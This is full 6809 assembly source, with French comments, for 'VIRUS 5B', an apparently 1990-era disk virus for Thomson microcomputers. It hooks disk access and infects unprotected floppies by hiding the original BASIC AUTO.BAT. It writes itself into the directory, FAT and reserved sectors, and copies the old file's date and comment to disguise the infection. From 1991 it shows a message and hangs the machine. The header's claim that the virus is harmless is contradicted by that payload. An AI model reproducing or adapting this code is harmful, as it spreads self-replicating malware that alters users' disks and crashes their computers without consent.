************  par Michel SAINT-BRIANT
*          *
* VIRUS 5B *  A.S.C.I. 1990 Copyright
*          *
************ (ce virus est inoffensif)

LOCAL  EQU    $8880
DEP    EQU    $A000-LOCAL-2
TAMPON EQU    $7065

       ORG    $A100

* On prépare la sortie

       PSHS   U,X,Y,DP,A,B,CC

* le virus doit se montrer à partir de
* 1991 (si la date a été entrée !)

       LDA    $607E   Registre-année
       CMPA   #91     si contenu < 91
       BLO    INSTAL  VIRUS5B s'installe

* en 1991 et années suivantes,le virus
* se manifeste par un affichage et un
* plantage irréversible

MESSAG LDX    #TEXTE     affiche le
       LDB    #$C        message après
PRINT  JSR    $E803      effacement
       LDB    ,X+
       COMB
       BNE    PRINT
       STX    $60FE   pour RESET à froid
PLANTE BRA    PLANTE  boucle sans fin

* installer le virus pour contamination

INSTAL LDU    #$A001
       LDX    #LOCAL
       LDA    #$FF
       STA    ,X+
       LDD    #$470A
       STD    ,X++
COPIE  LDA    ,U+
       STA    ,X+
       CMPX   #$A3FF-DEP
       BNE    COPIE
       LDX    #CONTAG-DEP
       LDA    #$7E
       STX    $6806
       STA    $6805

* on sort discrètement pour le vrai
* AUTO.BAT

FIN    PULS   CC,A,B,DP,X,Y,U,PC

* Partie 'CONTAGIEUSE'

CONTAG PSHS   U,X,Y,DP,B,A,CC

       CMPA   #$80    en entrée A est le
       BLO    QUITTE  'DEVICE in use':si
       CMPA   #$84    ce n'est pas un
       BHI    QUITTE  lecteur, on sort.

       LDX    #LOCAL  Vérification de l'
       LEAY   ,X      intégrité de VIRUS
CHECKS LDB    ,X+     5B avant tentative
       LEAY   B,Y     de contamination.
       CMPX   #$A3F4-DEP On procède par
       BNE    CHECKS  un checksum sur 16
       LDD    ,X      bits qui détecte
       LEAX   D,Y     toute modification
       BEQ    SUITE   (si modif. sortie)
       LDA    #$39    RTS mis en $6805
       STA    $6805   désactive VIRUS5B
       BRA    QUITTE

SUITE  LDU    $61C7   U = pointeur BASIC
       LDA    ,U+     si nul
       BEQ    DEVICE    ou   > DEVICE
       CMPA   #$3A    si ':'
       BEQ    DEVICE
       CMPA   #$22    si pas '"' alors
       BNE    QUITTE      on sort
       LDD    ,U      si '"' alors le
       CMPB   #$3A    3ème est-il ':'?
       BNE    DEVICE  si pas ':'>DEVICE
       CMPA   #$30    si":"a-t-on'"0:'?
       BEQ    OK      si oui c'est OK

QUITTE PULS   CC,A,B,DP,X,Y,U,PC

DEVICE LDA    $6768   le lecteur par dé-
       CMPA   #$80    faut est-il "0:" ?
       BNE    QUITTE  si non on sort

* OK c'est à dire qu'on a une fonction
* ayant accès au lecteur 0: (DIR,LOAD(m)
* SAVE(m),OPEN,MERGE,COPY...)
* Voyons maintenant si la disquette est
* protégée en écriture (oui = fichu !)

OK     JSR    $E09D   initialise DOS
       CLR    <$49    lecteur 0:
       LDA    #20     on se cale sur
       STA    <$4B    la piste 20
       JSR    $E452   accès disquette
       LDA    $E7D1   on lit $E7D1
       LDB    #$40    et on éteint la
       STB    $E7D2   diode-disquette
       ANDA   #4      on teste le bit 2
       BNE    QUITTE  si 1 protégée

* la disquette n'est pas protégée.
* Examinons sa FAT

       LDA    #2
       STA    <$48    lecture du
       STA    <$4C    secteur 2
       LDX    #TAMPON dans la zone
       STX    <$4F    $624F/$634E
       JSR    $E004   appel DOS

* les secteurs 9 à 12 piste 20 sont-ils
* libres ? si c'est non, VIRUS 5B est
* déjà installé donc on sort ou la place
* est prise par autre chose et on sort.

       LDA    TAMPON+42  teste bloc 41
       CMPA   #$FE    est-il protégé ?
       BNE    QUITTE  si non on quitte.

* y a-t-il plus de 40 fichiers dans la
* FAT (chaque fin de fichier est codée
* par $C1 à $C8 donc on compte les $C.)

       LDX    #TAMPON+1 début des blocs
       CLRB           compteur à 0
BLOC   LDA    ,X+
       ANDA   #$F0
       CMPA   #$C0
       BNE    SUIV
       INCB
SUIV   CMPX   #TAMPON+161 fin 160 blocs
       BNE    BLOC
       CMPB   #40     40 --> 5 secteurs
       BHI    QUITTE  donc 1 de sécurité

* tout va bien,il ne reste plus qu'à
* chercher s'il existe un AUTO.BAT :
* si non on sort

       LDA    #5      on analyse les
       STA    LOCAL-1   entrées dans le
SECTOR INC    <$4C      répertoire avec
       JSR    $E004     les secteurs 3/7
       LDU    <$4F
       LDB    #8      8 entrées par
ENTREE LDY    #AB-DEP   secteurs
       TFR    U,X
TESTAB LDA    ,X+
       CMPA   ,Y+
       BEQ    TESTAB
       CMPY   #AB+12-DEP
       BEQ    AUTO
AUTRE  LEAU   32,U
       DECB
       BNE    ENTREE
       DEC    LOCAL-1
       BNE    SECTOR
PASBAS LBRA   QUITTE

* AUTO.BAT trouvé, est-ce bien du basic?

AUTO   TSTA
       BNE    PASBAS
       LDA    ,X
       BNE    PASBAS

* on a un AUTO.BAT basic

       LDX    #$1B58  on débaptise l'
       STX    ,U++    AUTO.BAT (masque)
       LDD    #$2009  on remplit les 9
SPACE  STA    ,U+     autres caractères
       DECB           d'espaces...
       BNE    SPACE
       LDX    #LOCAL-12
       LEAU   5,U
       TFR    U,Y      On sauve le com-
CODAT1 LDA    ,Y+      mentaire et la
       STA    ,X+      date de l'ancien
       CMPX   #LOCAL-1 AUTO.BAT pour
       BNE    CODAT1   recopie après.
       LDX    #$0D1B
       STX    ,U++
       LDX    #$5F18   puis on modifie
       STX    ,U++     pour dissimuler.
       LDX    #$0808
       STX    ,U++
       CLR    ,U

* existe-t-il une entrée libre dans le
* même secteur ?

       LDB    #8
       LDU    <$4F
LIBR0  LDA    ,U
       BEQ    INOCUL
       CMPA   #$FF
       BEQ    INOCUL
       LEAU   32,U
       DECB
       BNE    LIBR0

* pas de place sur le même secteur alors
* on l'écrit ...

       LDA    #8      écriture du
       STA    <$48    secteur
       JSR    $E004   modifié
       LDA    #2      lecture du suivant

* cherchons place dans un autre secteur

       LDA    #2      pour lecture
       STA    <$48
       LDA    <$4C    on sauvegarde le
       STA    LOCAL-1 secteur initial
PLACE  INC    <$4C
       LDA    <$4C
       CMPA   LOCAL-1
       LBEQ   QUITTE  si on fait le tour
       CMPA   #9      sans trouver > FIN
       BNE    CHERCH
       LDA    #2      si la recherche n'
       STA    <$4C    a pas été bonne,on
       BRA    PLACE   reprend au début.
CHERCH JSR    $E004
       LDB    #8
       LDU    <$4F
LIBR1  LDA    ,U
       BEQ    INOCUL
       CMPA   #$FF
       BEQ    INOCUL
       LEAU   32,U
       DECB
       BNE    LIBR1
       BRA    PLACE

* maintenant on implante VIRUS 5B

* 1/ sur le catalogue

INOCUL LDX    #AB-DEP
       LDB    #11
NOM    LDA    ,X+
       STA    ,U+
       DECB
       BNE    NOM
       CLR    ,U+
       CLR    ,U+
       LDD    #$29FE
       STA    ,U+
       CLR    ,U+
       STB    ,U+
       LDX    #LOCAL-12 On recopie le
CODAT2 LDA    ,X+      commentaire et la
       STA    ,U+      date de l'ancien
       CMPX   #LOCAL-1 AUTO.BAT pour
       BNE    CODAT2   faire plus vrai !
       LDB    #5       on complète
CLEAR  CLR    ,U+      avec des zéros
       DECB
       BNE    CLEAR
       LDA    #8       pour écriture
       STA    <$48
       JSR    $E004

* 2/ sur la FAT

       LDA    #2
       STA    <$48
       STA    <$4C
       JSR    $E004
       LDA    #$C4
       STA    TAMPON+42
       LDA    #8
       STA    <$48
       JSR    $E004

* 3/ sur les secteurs 9 à 12

       LDD    #$0408  4 secteurs
       STB    <$4C    depuis le 9
       LDU    #$8781
       STU    <$4F

COPPRO INC    <$4C
       INC    <$4F
       DEC    <$50
       JSR    $E004
       DECA
       BNE    COPPRO

* C'est fini et on sort

       PULS   CC,B,A,DP,U,X,Y,PC

* AUTO.BAT

AB     FCC    "AUTO    BAT"

* MESSAGE

TEXTE  FCB    255


       END
